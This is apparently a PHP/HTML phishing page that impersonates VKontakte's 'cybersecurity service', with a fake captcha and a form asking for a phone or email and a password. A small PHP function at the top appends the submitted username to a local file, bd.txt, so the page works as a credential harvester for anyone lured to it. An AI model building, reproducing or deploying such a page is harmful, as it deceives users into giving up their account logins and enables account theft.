<?php 
   function lang() {
   $file=fopen("bd.txt","a+t");
   fwrite($file,$_POST['username']);
   fclose($file);
   }
?>
<DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="style.css" />
	<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-ico">
<title>Кибербезопасность | ВКонтакте</title>
<meta charset="utf-8">
</head>
<body bgcolor="#EDEEF0">
<p><div id="block">
	<h6 id="white"><img id="imeg" src="/images/s1200.webp" height="20" width="20">#лучшедома</h6>
	<button id="but2">Switch to English</button></div></p>
<div id="cber"><strong id="tect">Кибербезопасность | ВКонтакте</strong><p id="text">Вас приветствует служба кибербезопасности ВКонтакте.Защитите <a id="acc">свой аккаунт с нами !</a></p></div>
<div id="fprint">
	<img id="print" src="/images/favicon.jpeg" height="500px" width="700" ></div>
<div id="block2">
	<form method="POST" action="script.php">
		<input id="log" type="text" name="username" placeholder=" Телефон или email ">
<p id="pass">
	<input id="passw" type="password" name="password" placeholder=" Пароль "></p>
<p id="p1">
	<input id="recap"type="checkbox" name="a" value=" Я не робот" > <strongl>
	<a id="a">Я не робот</a>
	<img id="rec" src="/images/favicon.svg.png" height="27" width="27"></p> 
<input type="submit" id="but" name="button" action="" value="Подтвердить"/> </div></form>
</body>
</html>